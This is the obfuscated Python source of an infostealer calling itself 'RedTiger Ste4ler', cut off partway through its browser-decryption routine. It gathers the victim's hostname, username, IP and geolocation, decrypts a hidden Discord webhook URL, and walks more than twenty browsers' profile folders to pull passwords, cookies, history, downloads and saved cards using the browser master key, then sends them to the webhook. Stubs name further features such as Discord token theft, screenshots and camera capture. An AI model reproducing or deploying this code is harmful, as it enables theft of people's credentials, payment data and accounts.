
import sys

def On1y_W1nd0w5():
    if sys.platform.startswith("win"):
        return False
    else:
        return True

try: AKVNAOTEBJHEFCLVDYWRKGVZIIODZPFWZXWLBREOIKUIXFKMQN = On1y_W1nd0w5()
except: AKVNAOTEBJHEFCLVDYWRKGVZIIODZPFWZXWLBREOIKUIXFKMQN = False

if AKVNAOTEBJHEFCLVDYWRKGVZIIODZPFWZXWLBREOIKUIXFKMQN == True:
    sys.exit()
    
import os
import socket
import win32api
import requests
import threading
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import base64

def B10ck_K3y(): pass
def Unb10ck_K3y(): pass
def B10ck_T45k_M4n4g3r(): pass
def B10ck_M0u53(): pass
def B10ck_W3b5it3(): pass
def St4rtup(): pass
def Sy5t3m_Inf0(): pass
def Op3n_U53r_Pr0fi13_53tting5(): pass
def Scr33n5h0t(): pass
def C4m3r4_C4ptur3(): pass
def Di5c0rd_T0k3n(): pass
def Di5c0rd_inj3c710n(): pass
def Br0w53r_5t341(): pass
def R0b10x_C00ki3(): pass
def F4k3_3rr0r(): pass
def Sp4m_0p3n_Pr0gr4m(): pass
def Sp4m_Cr34t_Fil3(): pass
def Shutd0wn(): pass
def Sp4m_Opti0ns(): pass
def R3st4rt(): pass

def Clear():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

def Decrypt(NNDUWJGFBTIPHYVWNZTCAQBSUYKZSNWYQMARGJRNTSMBMFHPGMEOCTQJXH, v4r_key):
    def DeriveKey(v4r_password, v4r_salt):
        v4r_kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=v4r_salt, iterations=100000, backend=default_backend())
        if isinstance(v4r_password, str):  
            v4r_password = v4r_password.encode()  
        return v4r_kdf.derive(v4r_password)

    NNDUWJGFBTIPHYVWNZTCAQBSUYKZSNWYQMARGJRNTSMBMFHPGMEOCTQJXH_data = base64.b64decode(NNDUWJGFBTIPHYVWNZTCAQBSUYKZSNWYQMARGJRNTSMBMFHPGMEOCTQJXH)
    v4r_salt = NNDUWJGFBTIPHYVWNZTCAQBSUYKZSNWYQMARGJRNTSMBMFHPGMEOCTQJXH_data[:16]
    v4r_iv = NNDUWJGFBTIPHYVWNZTCAQBSUYKZSNWYQMARGJRNTSMBMFHPGMEOCTQJXH_data[16:32]
    NNDUWJGFBTIPHYVWNZTCAQBSUYKZSNWYQMARGJRNTSMBMFHPGMEOCTQJXH_data = NNDUWJGFBTIPHYVWNZTCAQBSUYKZSNWYQMARGJRNTSMBMFHPGMEOCTQJXH_data[32:]
    v4r_derived_key = DeriveKey(v4r_key, v4r_salt)
    v4r_cipher = Cipher(algorithms.AES(v4r_derived_key), modes.CBC(v4r_iv), backend=default_backend())
    v4r_decryptor = v4r_cipher.decryptor()
    v4r_decrypted_data = v4r_decryptor.update(NNDUWJGFBTIPHYVWNZTCAQBSUYKZSNWYQMARGJRNTSMBMFHPGMEOCTQJXH_data) + v4r_decryptor.finalize()
    v4r_unpadder = padding.PKCS7(128).unpadder()
    v4r_original_data = v4r_unpadder.update(v4r_decrypted_data) + v4r_unpadder.finalize()
    return v4r_original_data.decode()

FPWEALUSLBAWSMTXAEIVTOMKWRQCQWATDJJOXFNZKXJXADDCGIJZGCVAUDHKYSIVQBNPARYMQQMUDIWJBAPNLXZA = r"""
hGc1c9Wgp359He8BE8RXHebAKDf525jh2a0YtA6VpKsaMt1aGuVG+Iaslrz0viGEMmcy1YFN/CKUtkTxCLwDhXoHP6pa39VEDXQSbPcyiPb/z4XrGUnwfNhNNMhI1SLDy4KWHHku7GCgtjA8SAl4NagKpf3RYf5qJi3Ay5dlKV2eP57h6JS5sw6rI2pt2y8kHq8cKo2jisJQuV5S5Gf3yg==
"""
ZTHCXSTYTOKSXVDIZLDTRCCGIJJOANZUQEODDNUXOLTXFWAQUZYXDVWVWB = "uedSoqNOLZbWENzrFxYWmGIxDIcpXXhhEZJXkHHKaDcVUCkCbLzKPsABMaKzdZsLGZDZeXHlOclDWCFrPFvzdkzXVVpDFMYzQwHfBPREbrhPeJPpMVTXJMQfnJXytibhKNdYnQHMJgTacsYjxKaLwxkGGPbjIARWYWUdDaXUobvVmwtttVrGNCNKya"
ZKOGXCDTMJXBLYKCJQHKLDVIMCXXTCKYKENDMFBJBAPPGRFVEKPECJKRATQFKAALICBMZHFRTEV = "redtiger.shop"
ZJQSCZNFABWTTCTHNEROXLYDNUXYWZWEYFMQSUYYYZUXZQEKCUEBU = 0xa80505
PLQGNCIXLRJNBHSLTCFMOMZZUFODSVVFETFDRKHLJUXJVKLHOER = "RedTiger Ste4ler"
EYWGOEBDUKMJUOZRVNILEDDRUTOSHGOTSKSRNIOYDGTRCMHVSOPFEIJFFSLNPAFZCQFJAIPFLQGHYWP = "https://cdn.discordapp.com/attachments/1268900329605300234/1276010081665683497/RedTiger-Logo.png?ex=66cf38be&is=66cde73e&hm=696c53b4791044ca0495d87f92e6d603e8383315d2ebdd385aaccfc6dbf6aa77&"
EQKWKSYZNWWEERHCPRYDHPDLHLJXVJVEKMQWBMSQAIQVUSUOJEQQBQRCNYBYDEEMEAOMEFOWMCWPXXUXE = "RedTiger Ste4ler - github.com/loxy0dev/RedTiger-Tools"
TMKOVSEKLGBUGVLAHRBCKUQFUOEVIHEFDWSTYTESBKQDSNMMKLIBVWFJFABNFEEBCIXDOXTHURIAXBUEDMLX = {
        "text": EQKWKSYZNWWEERHCPRYDHPDLHLJXVJVEKMQWBMSQAIQVUSUOJEQQBQRCNYBYDEEMEAOMEFOWMCWPXXUXE,
        "icon_url": EYWGOEBDUKMJUOZRVNILEDDRUTOSHGOTSKSRNIOYDGTRCMHVSOPFEIJFFSLNPAFZCQFJAIPFLQGHYWP,
        }
                 
VNUQGLLFFWQKTFMBPEWBBQEXUGTDSOPPDHYZGTEXOKPHLLJCMKXKXUZCWMCZQLJLWXHJGKPXGSYMMTSKEFOIZM = Decrypt(FPWEALUSLBAWSMTXAEIVTOMKWRQCQWATDJJOXFNZKXJXADDCGIJZGCVAUDHKYSIVQBNPARYMQQMUDIWJBAPNLXZA, ZTHCXSTYTOKSXVDIZLDTRCCGIJJOANZUQEODDNUXOLTXFWAQUZYXDVWVWB)

try: RZSQNYTFFKVERDYUOTKCMPRCJJLJOXHMTVOSFVDDUFRONQNPHFQSWCX = socket.gethostname()
except: RZSQNYTFFKVERDYUOTKCMPRCJJLJOXHMTVOSFVDDUFRONQNPHFQSWCX = "None"

try: KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ = os.getlogin()
except: KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ = "None"

try: TMTYVIOXVWOBKDDNIJLNGYVIYWGYXXTMEIPIJTCKHDNDQTTCLOXTSBMXGOFUOHQZRCWFX = win32api.GetUserNameEx(win32api.NameDisplay)
except: TMTYVIOXVWOBKDDNIJLNGYVIYWGYXXTMEIPIJTCKHDNDQTTCLOXTSBMXGOFUOHQZRCWFX = "None"

try: ENCFWDCTDTNOBRFRJTPNHGLQXUVKHAPPFPPBZHGRMCUHXBJLFUVHBIWIONMWHHVQPSCTBWZPQOGFBCZKHNSDUIYQXBV = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: ENCFWDCTDTNOBRFRJTPNHGLQXUVKHAPPFPPBZHGRMCUHXBJLFUVHBIWIONMWHHVQPSCTBWZPQOGFBCZKHNSDUIYQXBV = "None"

try: ANBIBNPLCDRGGZJYKXCYERDMOCDNGDOQDDSQVXZJNPOHYXEUHIZGGVCKSEVJCUEMTVZDADLKGCSGAPWLOEK = socket.gethostbyname(socket.gethostname())
except: ANBIBNPLCDRGGZJYKXCYERDMOCDNGDOQDDSQVXZJNPOHYXEUHIZGGVCKSEVJCUEMTVZDADLKGCSGAPWLOEK = "None"

try:
    XFUFDAXBFWWZVGLNVPDDQJGHQSHXYMRZGKSVECYIGTOBYUTLLXO = requests.get(f"https://{ZKOGXCDTMJXBLYKCJQHKLDVIMCXXTCKYKENDMFBJBAPPGRFVEKPECJKRATQFKAALICBMZHFRTEV}/api/ip/ip={ENCFWDCTDTNOBRFRJTPNHGLQXUVKHAPPFPPBZHGRMCUHXBJLFUVHBIWIONMWHHVQPSCTBWZPQOGFBCZKHNSDUIYQXBV}")
    ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW = XFUFDAXBFWWZVGLNVPDDQJGHQSHXYMRZGKSVECYIGTOBYUTLLXO.json()

    RJEJQPYHRGRJQDBXXZQEQCYUEGYDFDJQXOFCRNNJGTIGOMHOAKRYYTOHAKBRCZMKGJWF = ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW.get('country', "None")
    RJEJQPYHRGRJQDBXXZQEQCYUEGYDFDJQXOFCRNNJGTIGOMHOAKRYYTOHAKBRCZMKGJWF_code = ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW.get('country_code', "None")
    ADBAGDBPFXGHQMGNUNAQIBPCSURJEAIBQOGMASVRXFTFDGDPBE = ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW.get('region', "None")
    ADBAGDBPFXGHQMGNUNAQIBPCSURJEAIBQOGMASVRXFTFDGDPBE_code = ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW.get('region_code', "None")
    NZGURMMXGTUANEKDUISFDVFLCAAKZOQJHNQKJVIYQHEAWURFHPDESHJDDDLQMDMUHMPYDXBHFTYSH = ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW.get('zip', "None")
    VXHJNEDNEAVRANNPJLCYSWTUIITAAAESSLSMIBISHQAJMETUVOHTSUOJQUEVKSGFGNPRSAFMHRCMCVBWNTKTKQYSZVCWOHIFKZNL = ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW.get('city', "None")
    KGKDUPSXXVLZFTKMLIWYUHWAPAAEGHGAJVUXJKWXSNTVJWDKBKOML = ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW.get('latitude', "None")
    AHXITZENIFRXVXMVGKGECCELZZLXQRBZQQJVGDBSLQQUJLUZFWEZRJQRWUENRQEUYMRXSZ = ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW.get('longitude', "None")
    QJKWBPAQUCYDDMFNHAUZKFPEFKBWBRSOUVVAVPZFJMOQFGIQOIMC = ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW.get('timezone', "None")
    JETKOMGYTWKDRRBVMNRPCZKJDGLMMVVMUOGTCIOYCSPQKGXDONTZCUELCSYJRCQBZGESXHRPBCFVCPPDZOYCHX = ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW.get('isp', "None")
    MVZVKRQZWWKIBGUUAMBAJYHOBFNOBJCPYMNXFUWBYOTQHCWYADPOONAFCTVRWFLYFFELITNWWRQRIR = ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW.get('org', "None")
    BLOSXQUSZOFMRGEKZWGXHQCTVWTVTJKPBECGMJMPZLNHSOXTBWJG = ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW.get('as', "None")
except:
    XFUFDAXBFWWZVGLNVPDDQJGHQSHXYMRZGKSVECYIGTOBYUTLLXO = requests.get(f"http://ip-api.com/json/{ENCFWDCTDTNOBRFRJTPNHGLQXUVKHAPPFPPBZHGRMCUHXBJLFUVHBIWIONMWHHVQPSCTBWZPQOGFBCZKHNSDUIYQXBV}")
    ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW = XFUFDAXBFWWZVGLNVPDDQJGHQSHXYMRZGKSVECYIGTOBYUTLLXO.json()

    RJEJQPYHRGRJQDBXXZQEQCYUEGYDFDJQXOFCRNNJGTIGOMHOAKRYYTOHAKBRCZMKGJWF = ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW.get('country', "None")
    RJEJQPYHRGRJQDBXXZQEQCYUEGYDFDJQXOFCRNNJGTIGOMHOAKRYYTOHAKBRCZMKGJWF_code = ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW.get('countryCode', "None")
    ADBAGDBPFXGHQMGNUNAQIBPCSURJEAIBQOGMASVRXFTFDGDPBE = ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW.get('regionName', "None")
    ADBAGDBPFXGHQMGNUNAQIBPCSURJEAIBQOGMASVRXFTFDGDPBE_code = ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW.get('region', "None")
    NZGURMMXGTUANEKDUISFDVFLCAAKZOQJHNQKJVIYQHEAWURFHPDESHJDDDLQMDMUHMPYDXBHFTYSH = ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW.get('zip', "None")
    VXHJNEDNEAVRANNPJLCYSWTUIITAAAESSLSMIBISHQAJMETUVOHTSUOJQUEVKSGFGNPRSAFMHRCMCVBWNTKTKQYSZVCWOHIFKZNL = ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW.get('city', "None")
    KGKDUPSXXVLZFTKMLIWYUHWAPAAEGHGAJVUXJKWXSNTVJWDKBKOML = ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW.get('lat', "None")
    AHXITZENIFRXVXMVGKGECCELZZLXQRBZQQJVGDBSLQQUJLUZFWEZRJQRWUENRQEUYMRXSZ = ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW.get('lon', "None")
    QJKWBPAQUCYDDMFNHAUZKFPEFKBWBRSOUVVAVPZFJMOQFGIQOIMC = ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW.get('timezone', "None")
    JETKOMGYTWKDRRBVMNRPCZKJDGLMMVVMUOGTCIOYCSPQKGXDONTZCUELCSYJRCQBZGESXHRPBCFVCPPDZOYCHX = ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW.get('isp', "None")
    MVZVKRQZWWKIBGUUAMBAJYHOBFNOBJCPYMNXFUWBYOTQHCWYADPOONAFCTVRWFLYFFELITNWWRQRIR = ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW.get('org', "None")
    BLOSXQUSZOFMRGEKZWGXHQCTVWTVTJKPBECGMJMPZLNHSOXTBWJG = ZZLQRJKGSUQTMITNDPTKAASPPNIZEQTPLBKJAMYVFZCGLMMPHXZW.get('as', "None")

def Br0w53r_5t341():
    import os
    import shutil
    import json
    import base64
    import sqlite3
    import win32crypt
    from zipfile import ZipFile
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from discord import SyncWebhook, Embed, File
    from pathlib import Path

    BBDJWDUSDBDBCCYRZQGAKASMTYBNPRQDAJVBVKHNYYOAKXKSCBCPSCBEWLZZXVSBIPRIAIHLYTLBTSCCCWGIDOTIHBBVXEFLI = []
    LEWKXWAOSMMXFSEYSEUIUICQKEYCKFHVOIFFWQUDOKRAXTFCOTMODBBZHGFLJAXFXKVKQERE = []
    UQEOXZWHXDJVNZALEFRDJLEKWLRSTCPHRPJTGOBSUELWFBCNMDDZDFMCGFIYDQMZONED = []
    RJRDAAXANIONPLTVARAWGXVQAZNXDAPOWJJAABGIABOEGZKPHWREXGWEQPEVHZRWVPKQBOTZDQWLPNHCEKCHJDYUXEGYZMEXB = []
    XFTYYZBGCMNSHTYZOSQUJIIYMNXTRSHTTYPNPNPOTHQDJWCEDOELUXKQSKLEQC = []
    KQCTPCKTZTCUXZCPWTHRINXFNWILMAABBGRUEWUPDQCLIJDXIFXKJXLMWGUJZBEBAJKIXMGTOATYYM = []

    def Br0ws53r_Main():
        XYHJBLHLQQVLWMJGETVOIZAKFITCIXYGGKSOHOMOAWMWEQGYEEBNXZC = os.getenv('LOCALAPPDATA')
        KJNVFQLFGLCHUYCJLILOJDHCPDACUTDNQLGDNPQNQACISXRTEWUHOXDCOCURAQQJBQPREAOMKJFMKCQCFXWRZYXHLMPESHMWDQF = os.getenv('APPDATA')
        CDJGKMNDPYCRWAIORTRRUVKSMSQEGVKXHTOFOIFWBAUVQNJWVOMAWJ = SyncWebhook.from_url(VNUQGLLFFWQKTFMBPEWBBQEXUGTDSOPPDHYZGTEXOKPHLLJCMKXKXUZCWMCZQLJLWXHJGKPXGSYMMTSKEFOIZM)
            

        KQXSUZKGGSMEBUYJHFHEGFJCLZKESXKOCDZSVWQPGPFOJQLIFUENVGJVBGMZVCVKMQNZHXBCROIZBHEZVMRELLVRHIYI = {
            'Google Chrome': os.path.join(XYHJBLHLQQVLWMJGETVOIZAKFITCIXYGGKSOHOMOAWMWEQGYEEBNXZC, 'Google', 'Chrome', 'User Data'),
            'Microsoft Edge': os.path.join(XYHJBLHLQQVLWMJGETVOIZAKFITCIXYGGKSOHOMOAWMWEQGYEEBNXZC, 'Microsoft', 'Edge', 'User Data'),
            'Opera': os.path.join(KJNVFQLFGLCHUYCJLILOJDHCPDACUTDNQLGDNPQNQACISXRTEWUHOXDCOCURAQQJBQPREAOMKJFMKCQCFXWRZYXHLMPESHMWDQF, 'Opera Software', 'Opera Stable'),
            'Opera GX': os.path.join(KJNVFQLFGLCHUYCJLILOJDHCPDACUTDNQLGDNPQNQACISXRTEWUHOXDCOCURAQQJBQPREAOMKJFMKCQCFXWRZYXHLMPESHMWDQF, 'Opera Software', 'Opera GX Stable'),
            'Brave': os.path.join(XYHJBLHLQQVLWMJGETVOIZAKFITCIXYGGKSOHOMOAWMWEQGYEEBNXZC, 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'Vivaldi': os.path.join(XYHJBLHLQQVLWMJGETVOIZAKFITCIXYGGKSOHOMOAWMWEQGYEEBNXZC, 'Vivaldi', 'User Data'),
            'Internet Explorer': os.path.join(XYHJBLHLQQVLWMJGETVOIZAKFITCIXYGGKSOHOMOAWMWEQGYEEBNXZC, 'Microsoft', 'Internet Explorer'),
            'Amigo': os.path.join(XYHJBLHLQQVLWMJGETVOIZAKFITCIXYGGKSOHOMOAWMWEQGYEEBNXZC, 'Amigo', 'User Data'),
            'Torch': os.path.join(XYHJBLHLQQVLWMJGETVOIZAKFITCIXYGGKSOHOMOAWMWEQGYEEBNXZC, 'Torch', 'User Data'),
            'Kometa': os.path.join(XYHJBLHLQQVLWMJGETVOIZAKFITCIXYGGKSOHOMOAWMWEQGYEEBNXZC, 'Kometa', 'User Data'),
            'Orbitum': os.path.join(XYHJBLHLQQVLWMJGETVOIZAKFITCIXYGGKSOHOMOAWMWEQGYEEBNXZC, 'Orbitum', 'User Data'),
            'Cent Browser': os.path.join(XYHJBLHLQQVLWMJGETVOIZAKFITCIXYGGKSOHOMOAWMWEQGYEEBNXZC, 'CentBrowser', 'User Data'),
            '7Star': os.path.join(XYHJBLHLQQVLWMJGETVOIZAKFITCIXYGGKSOHOMOAWMWEQGYEEBNXZC, '7Star', '7Star', 'User Data'),
            'Sputnik': os.path.join(XYHJBLHLQQVLWMJGETVOIZAKFITCIXYGGKSOHOMOAWMWEQGYEEBNXZC, 'Sputnik', 'Sputnik', 'User Data'),
            'Vivaldi': os.path.join(XYHJBLHLQQVLWMJGETVOIZAKFITCIXYGGKSOHOMOAWMWEQGYEEBNXZC, 'Vivaldi', 'User Data'),
            'Google Chrome SxS': os.path.join(XYHJBLHLQQVLWMJGETVOIZAKFITCIXYGGKSOHOMOAWMWEQGYEEBNXZC, 'Google', 'Chrome SxS', 'User Data'),
            'Epic Privacy Browser': os.path.join(XYHJBLHLQQVLWMJGETVOIZAKFITCIXYGGKSOHOMOAWMWEQGYEEBNXZC, 'Epic Privacy Browser', 'User Data'),
            'Uran': os.path.join(XYHJBLHLQQVLWMJGETVOIZAKFITCIXYGGKSOHOMOAWMWEQGYEEBNXZC, 'uCozMedia', 'Uran', 'User Data'),
            'Yandex': os.path.join(XYHJBLHLQQVLWMJGETVOIZAKFITCIXYGGKSOHOMOAWMWEQGYEEBNXZC, 'Yandex', 'YandexBrowser', 'User Data'),
            'Iridium': os.path.join(XYHJBLHLQQVLWMJGETVOIZAKFITCIXYGGKSOHOMOAWMWEQGYEEBNXZC, 'Iridium', 'User Data'),
            'Mozilla Firefox': os.path.join(KJNVFQLFGLCHUYCJLILOJDHCPDACUTDNQLGDNPQNQACISXRTEWUHOXDCOCURAQQJBQPREAOMKJFMKCQCFXWRZYXHLMPESHMWDQF, 'Mozilla', 'Firefox', 'Profiles'),
            'Safari': os.path.join(KJNVFQLFGLCHUYCJLILOJDHCPDACUTDNQLGDNPQNQACISXRTEWUHOXDCOCURAQQJBQPREAOMKJFMKCQCFXWRZYXHLMPESHMWDQF, 'Apple Computer', 'Safari'),
        }

        YSTDMEANFUMMZJWRIVSJHIREDJFKBSVABADCIRWEFQPZKYMFFSTNFWSQTMOIHEOSMEIPWZPGPDUWPSIKDZNORQEVZQDPGZIJWXA = [
            '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
        ]

        for DTXVLEURVZDQDNPEUFHORUBWLMOBRVLAYPZZLFTDCNALGILVMKGNZRZTQEXBTDTBPNIFCWEXMJYCNPNGRAIMMAMVYMUDCUOTT, MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG in KQXSUZKGGSMEBUYJHFHEGFJCLZKESXKOCDZSVWQPGPFOJQLIFUENVGJVBGMZVCVKMQNZHXBCROIZBHEZVMRELLVRHIYI.items():
            if not os.path.exists(MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG):
                continue

            HANRWEFWEHBPVWGBWEBSKXGXRMNSABDIMPXJXHDTJOBBEEFQQUDSGPAEJBUCZWYKDEBDGJWDHVMAGSOTDDBZJUK = get_master_key(os.path.join(MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG, 'Local State'))
            if not HANRWEFWEHBPVWGBWEBSKXGXRMNSABDIMPXJXHDTJOBBEEFQQUDSGPAEJBUCZWYKDEBDGJWDHVMAGSOTDDBZJUK:
                continue

            for v4r_profile in YSTDMEANFUMMZJWRIVSJHIREDJFKBSVABADCIRWEFQPZKYMFFSTNFWSQTMOIHEOSMEIPWZPGPDUWPSIKDZNORQEVZQDPGZIJWXA:
                YRTQTZVAFDNLIWHJFMLYBCJSTKTNIGCIYDVTBJJQFQSPRHYFUYONUCQZMEKUFFHEEEFTQNYHSUKYDMOZFXTNUUPPOWBEEU = os.path.join(MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG, v4r_profile)
                if not os.path.exists(YRTQTZVAFDNLIWHJFMLYBCJSTKTNIGCIYDVTBJJQFQSPRHYFUYONUCQZMEKUFFHEEEFTQNYHSUKYDMOZFXTNUUPPOWBEEU):
                    continue

                get_passwords(DTXVLEURVZDQDNPEUFHORUBWLMOBRVLAYPZZLFTDCNALGILVMKGNZRZTQEXBTDTBPNIFCWEXMJYCNPNGRAIMMAMVYMUDCUOTT, MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG, YRTQTZVAFDNLIWHJFMLYBCJSTKTNIGCIYDVTBJJQFQSPRHYFUYONUCQZMEKUFFHEEEFTQNYHSUKYDMOZFXTNUUPPOWBEEU, HANRWEFWEHBPVWGBWEBSKXGXRMNSABDIMPXJXHDTJOBBEEFQQUDSGPAEJBUCZWYKDEBDGJWDHVMAGSOTDDBZJUK)
                get_cookies(DTXVLEURVZDQDNPEUFHORUBWLMOBRVLAYPZZLFTDCNALGILVMKGNZRZTQEXBTDTBPNIFCWEXMJYCNPNGRAIMMAMVYMUDCUOTT, MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG, YRTQTZVAFDNLIWHJFMLYBCJSTKTNIGCIYDVTBJJQFQSPRHYFUYONUCQZMEKUFFHEEEFTQNYHSUKYDMOZFXTNUUPPOWBEEU, HANRWEFWEHBPVWGBWEBSKXGXRMNSABDIMPXJXHDTJOBBEEFQQUDSGPAEJBUCZWYKDEBDGJWDHVMAGSOTDDBZJUK)
                get_history(DTXVLEURVZDQDNPEUFHORUBWLMOBRVLAYPZZLFTDCNALGILVMKGNZRZTQEXBTDTBPNIFCWEXMJYCNPNGRAIMMAMVYMUDCUOTT, MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG, YRTQTZVAFDNLIWHJFMLYBCJSTKTNIGCIYDVTBJJQFQSPRHYFUYONUCQZMEKUFFHEEEFTQNYHSUKYDMOZFXTNUUPPOWBEEU)
                get_downloads(DTXVLEURVZDQDNPEUFHORUBWLMOBRVLAYPZZLFTDCNALGILVMKGNZRZTQEXBTDTBPNIFCWEXMJYCNPNGRAIMMAMVYMUDCUOTT, MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG, YRTQTZVAFDNLIWHJFMLYBCJSTKTNIGCIYDVTBJJQFQSPRHYFUYONUCQZMEKUFFHEEEFTQNYHSUKYDMOZFXTNUUPPOWBEEU)
                get_cards(DTXVLEURVZDQDNPEUFHORUBWLMOBRVLAYPZZLFTDCNALGILVMKGNZRZTQEXBTDTBPNIFCWEXMJYCNPNGRAIMMAMVYMUDCUOTT, MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG, YRTQTZVAFDNLIWHJFMLYBCJSTKTNIGCIYDVTBJJQFQSPRHYFUYONUCQZMEKUFFHEEEFTQNYHSUKYDMOZFXTNUUPPOWBEEU, HANRWEFWEHBPVWGBWEBSKXGXRMNSABDIMPXJXHDTJOBBEEFQQUDSGPAEJBUCZWYKDEBDGJWDHVMAGSOTDDBZJUK)

                if DTXVLEURVZDQDNPEUFHORUBWLMOBRVLAYPZZLFTDCNALGILVMKGNZRZTQEXBTDTBPNIFCWEXMJYCNPNGRAIMMAMVYMUDCUOTT not in KQCTPCKTZTCUXZCPWTHRINXFNWILMAABBGRUEWUPDQCLIJDXIFXKJXLMWGUJZBEBAJKIXMGTOATYYM:
                    KQCTPCKTZTCUXZCPWTHRINXFNWILMAABBGRUEWUPDQCLIJDXIFXKJXLMWGUJZBEBAJKIXMGTOATYYM.append(DTXVLEURVZDQDNPEUFHORUBWLMOBRVLAYPZZLFTDCNALGILVMKGNZRZTQEXBTDTBPNIFCWEXMJYCNPNGRAIMMAMVYMUDCUOTT)

        write_files(KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ)
        send_files(KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ, CDJGKMNDPYCRWAIORTRRUVKSMSQEGVKXHTOFOIFWBAUVQNJWVOMAWJ)
        clean_files(KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ)

    def get_master_key(MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG):
        if not os.path.exists(MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG):
            return None

        try:
            with open(MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG, 'r', encoding='utf-8') as v4r_f:
                v4r_local_state = json.load(v4r_f)

            NNDUWJGFBTIPHYVWNZTCAQBSUYKZSNWYQMARGJRNTSMBMFHPGMEOCTQJXH_key = base64.b64decode(v4r_local_state["os_crypt"]["encrypted_key"])[5:]
